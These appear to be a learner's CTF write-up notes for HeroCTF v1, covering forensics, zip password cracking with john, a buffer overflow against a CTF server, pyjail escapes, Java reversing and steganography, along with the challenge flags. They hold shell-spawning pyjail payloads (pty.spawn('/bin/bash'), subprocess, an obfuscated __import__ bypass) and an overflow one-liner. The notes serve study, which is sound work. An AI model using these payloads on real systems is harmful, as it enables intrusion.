#Cyber-Security Training
#j3kyll
#PATH :~/Vidéos/Hyd3-100Days/Ted_2.0/Security-Advanced/V? heroctf/HeroCTF_v1/* |!web

II-Forensic

When  you do forensic you would have any tools for the investigation 

-exiftools
-strings
-hexdump
-Foremost
-
Differents crimes scenes (💉)

-Blank page
All traces ans foot print is clean and you don't going to see informations
-Solution:Ctrl+A (if you have a choice)

*searching exadecimal editor*//OK

III-MISC
1-
* https://www.rapidtables.com/convert/number/binary-to-ascii.html) *<- searching //OK

2-Brute force
here you have one file zip (flag.txt.zip)<-for decompressed this file you would use passwd

`john2zip flag.txt.zip |tee flag.hash `
After any data are insert in the 'flag.hash'

`john --wordlist=/PATH/TO/YOUR/DICTIONNARY    flag.hash ` 
The password is display

IV-NETWORK

Here the pcap file is give you ,you search the flag so you make the filtrage

Search correctly the flag query by query 

V-OSINT
Here the link around the social network app 
If you searching goog you can locate the flag

VI-PWN

-Introduction buffer overflow
The script use in the pwn challenges are already in C 

EX:
This code is present on the server 
nc heroctf.fr 3000
` 
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
  setvbuf(stdout, NULL, _IONBF, 0);  
  int var;
  int check = 0xdeadbeef;
  char buf[40];

  printf("Déborde moi mon cochon : ");
 
  fgets(buf,40,stdin);
 
  if (check!= 0xdeadbeef){
    printf ("\nGG wola tu m'as eu\n");
    setreuid(geteuid(), geteuid());
    system("cat flag.txt");
    printf("Voilà ton flag petit fou.\n");
  }
 
  if (check == 0xdeadbeef)
   {
     printf("Essaie encore...\n");
   }
   return 0;
}
` 


Here we seeing that the buf is a table of 40 char and can't have over 40 char so we enter over 40 char in the buf and you observe the displaying of flag


Astuce Python :
`python -C "print('A'*50)" |nc heroctf.fr 3000` <-here 3000 is the ports at which move the server

If you run the program to local you don't see the flag because the flag is at the server
 


2-Introduction Pyjails
On the server the administrator install the service who execute python scripts

nc heroctf.fr 3002


` 
nc heroctf.fr 3002

Enter your code below:
import os <- is call for used the CLI linux
os.system('ls')
EOF
entry.sh
flag.txt
programs
shell.py
=============== END =================
Enter your code below:
import os
os.system('cat flag.txt')
EOF
HeroCTF{os_sh0uld_b3_dis4bl3d_by_4dmin}

` 

...And it's possible that the command line at your os create a error
For exemple:
In the Others Pyjails ctf the command (ls ,cat ,cd are block, and the text contains 'os' are delete)

Others Methode:
`
import pty
pty.spawn('/bin/bash')
` 
Or

`
import subprocess
subprocess.call("/bin/bash")
` 

Info :
*EOF:End Of File*



Other ....Others Methode 
Here the server administrator replace python interpreter by calculatrice

 `__import__('pty').spawn('/bin/bash'+chr(ord('h'))) ` 

Others....Others...Others God Python and Pyjail
See:*~/Vidéos/Hyd3-100Days/Ted_2.0/Security-Advanced/V? heroctf/HeroCTF_v1/Challenges/Pwn/Pyrate_4*

In Cyber training Security pwn in not obligent ok ?not a army , my arm is not really big and you and your arm is very big at mine bg 



VII-REVERSE
*JAVAHACK*

HI My first impression is THAT Reverse is so difficult

Here two (2) hint you are given 
hint 1 : http://www.javadecompilers.com/ 
hint 2 : https://github.com/java-decompiler/jd-gui (personnally i don't use this project)

When i used the first link i see a web site who allow upload a code (seen that this code is already compiled)
This site dislpay the code of java app after you have upload it from  the site
//This site shows Java application code after you download it from the site

When you observe good you will see the flag

`

import java.awt.Component;
import javax.swing.JOptionPane;

// 
// Decompiled by Procyon v0.5.36
// 

class JavHack1
{
    public static void main(final String[] array) {
        int i = 1;
        while (i != 0) {
            if (JOptionPane.showInputDialog("Enter the password :").equals("v3rY_34sy_fl4g_010101")) {
                i = 0;
                JOptionPane.showMessageDialog(null, "GG ! You can validate the challenge with this password");
            }
            else {
                JOptionPane.showMessageDialog(null, "Wrong flag !");
            }
        }
    }
}
/v3rY_34sy_fl4g_010101/

 `  


JAVAHACK2

Here is too bizarre

`


import java.awt.Component;
import javax.swing.JOptionPane;

// 
// Decompiled by Procyon v0.5.36
// 

class JavHack2
{
    public static void main(final String[] array) {
        int i = 1;
        while (i != 0) {
            if (checkPassword(JOptionPane.showInputDialog("Enter the password :"))) {
                i = 0;
                JOptionPane.showMessageDialog(null, "GG ! You can validate the challenge with this password");
            }
            else {
                JOptionPane.showMessageDialog(null, "Wrong flag !");
            }
        }
    }
    
    public static boolean checkPassword(final String s) {
        if (s == null && s.trim().isEmpty()) {
            return false;
        }
        final byte[] bytes = s.getBytes();
        final byte[] array = { 52, 53, 99, 49, 49, 95, 119, 49, 55, 104, 95, 106, 52, 118, 52, 95, 120, 100, 95, 49, 48, 53, 56, 50 };
        if (bytes.length != array.length) {
            return false;
        }
        for (int i = 0; i < array.length; ++i) {
            if (bytes[i] != array[i]) {
                return false;
            }
        }
        return true;
    }
}


 `
When you observe the function 'checkPassword' you will see that he compared the char in the arrat 'bytes' with your input
By intuition i see that all char are the ASSCII TABLE and now i search which char is number

` 45c11_w17h_j4v4_xd_10582` 

Or i use python Method
```python
arr = [52, 53, 99, 49, 49, 95, 119, 49, 55, 104, 95, 106, 52, 118, 52, 95, 120, 100, 95, 49, 48, 53, 56, 50]

for elem in arr:
	print(chr(elem), end="")
```

JAVAHACK 3
-
` 

import java.awt.Component;
import javax.swing.JOptionPane;

// 
// Decompiled by Procyon v0.5.36
// 

class JavHack3
{
    public static void main(final String[] array) {
        int i = 1;
        while (i != 0) {
            if (checkPassword(JOptionPane.showInputDialog("Enter the password :"))) {
                i = 0;
                JOptionPane.showMessageDialog(null, "GG ! You can validate the challenge with this password");
            }
            else {
                JOptionPane.showMessageDialog(null, "Wrong flag !");
            }
        }
    }
    
    public static boolean checkPassword(final String s) {
        if (s == null && s.trim().isEmpty()) {
            return false;
        }
        final byte[] bytes = s.getBytes();
        final byte[] array = { 26, 13, 16, 29, 43, 49, 29, 17, 13, 29, 4, 23, 12, 12, 27, 99, 99, 99, 99, 99, 99, 99, 99, 99, 29, 114, 115 };
        final byte b = 66;
        if (bytes.length != array.length) {
            return false;
        }
        for (int i = 0; i < array.length; ++i) {
            if (bytes[i] != (array[i] ^ b)) {
                return false;
            }
        }
        return true;
    }
}

`
Here the source has changed a bit
Your input is compared with the char contains in the array but any char is XORRED (In java '^' is used for xorred the number )
 
 If you want you used 'http://xor.pw/'
 
 Python help me!
 
``python
arr = [26, 13, 16, 29, 43, 49, 29, 17, 13, 29, 4, 23, 12, 12, 27, 99, 99, 99, 99, 99, 99, 99, 99, 99, 29, 114, 115]
key = 66

for item in arr:
	print(chr(item ^ key), end="")
```
Answer : XOR_is_SO_FUNNY!!!!!!!!!\_01


JAVAHACK 4
`

import java.util.Scanner;

// 
// Decompiled by Procyon v0.5.36
// 

public class JavHack4
{
    public static void main(final String[] array) {
        final Scanner scanner = new Scanner(System.in);
        System.out.print("Enter vault password: ");
        if (checkPassword(obfuscation(scanner.next()))) {
            System.out.println("Access granted.");
        }
        else {
            System.out.println("Access denied!");
        }
    }
    
    public static String[] obfuscation(final String s) {
        final char[] charArray = s.toCharArray();
        final String[] array = new String[charArray.length];
        for (int i = 0; i < charArray.length; ++i) {
            array[i] = Integer.toBinaryString(charArray[i]);
        }
        for (int j = 0; j < array.length; ++j) {
            array[j] = swap(array[j], 2, 3);
            array[j] = swap(array[j], 5, 1);
        }
        return array;
    }
    
    public static String swap(final String s, final int n, final int n2) {
        if (s != null && n < s.length() && n2 < s.length()) {
            final char[] charArray = s.toCharArray();
            final char c = charArray[n];
            charArray[n] = charArray[n2];
            charArray[n2] = c;
            return new String(charArray);
        }
        return null;
    }
    
    public static boolean checkPassword(final String[] array) {
        final int[] array2 = { 114, 41, 110, 82, 41, 99, 115, 125, 49, 57, 125, 57, 33, 125, 102, 79, 118, 118, 91, 125, 49, 33, 41, 37, 35, 49 };
        for (int i = 0; i < array.length; ++i) {
            if (array2[i] != Integer.parseInt(array[i], 2)) {
                return false;
            }
        }
        return true;
    }
}

`

firstly you input is changed in char array who after is changed in  array string  who contains the binary code  of each char
After the char 2 is changed with char 3 and char 5 with the 1


And after is compared with your input

````python
password = [114, 41, 110, 82, 41, 99, 115, 125, 49, 57, 125, 57, 33, 125, 102, 79, 118, 118, 91, 125, 49, 33, 41, 37, 35, 49]

for elem in password:
	binary = list(str(bin(elem)).replace("0b", ""))
	binary[5], binary[1] = binary[1], binary[5]
	binary[2], binary[3] = binary[3], binary[2]
	print(chr(int("".join(binary), 2)), end="")
```` 

Résultat : j4vh4ck_15_50_funny_104821



VIII-
SEQUENCE 
It's the  brain challenge 
1-
Problem's:
Trouver les deux termes manquants:

21, 34, 55, ?, ?

It's the fibonnacci code here the each number is  sum of the  two number before him 
so 
`21 	34 	55 	89 	144  `

2-
Trouver le chiffre et le nombre manquants:
Challenge name:Mr robot 
1-10, 2-12, 3-10, ?-?


It's funny challenge broooo😹
It's a ref' a Mr robot serie and the each season is associat number of episodes ,search in the google

Answers:4-13

IX-STEGANO

1-L'habit ne fait pas le moine 
Yeahh
ok
You have a picture who isn't the good extension

`file PQ.png `
A:

`PQ.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 504x672, components 3 `
So it's the JFIF file ,then it's the jpeg file container the others file

`binwalk -e PQ.png ` 
R:
` DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
44528         0xADF0          Zip archive data, at least v1.0 to extract, name: PasEncoreFinis/
44573         0xAE1D          Zip archive data, at least v2.0 to extract, compressed size: 70, uncompressed size: 68, name: PasEncoreFinis/flag.txt
44898         0xAF62          End of Zip archive, footer length: 22
`


Then the file directory PasEncoreFinis/ is extract on the picture and contain two files


`ADF0.zip  PasEncoreFinis/` the directory PasEncoreFiis is empty,we extracted the zip file and the file extract going in the directory PasEncoreFinis
 ̀ cd PasEncoreFinis/ && cat flag.txt`
 
R: `Vous pensiez que c'était aussi simple ?

SGVyb0NURnszNFNZX0ZMNEd9 `
Hum i think that this message is a 64base
` echo "SGVyb0NURnszNFNZX0ZMNEd9 "|base64 -d`

R:` HeroCTF{34SY_FL4G}`

2-
He you is gived   a picture enough shadow
I use gimp >"Couleurs" > "Luminosité-contraste" and you up contrast and lightly at  max level
And you see the flag
R: ` jy9hbt` 

 
 
  


 



















































































































End -Report
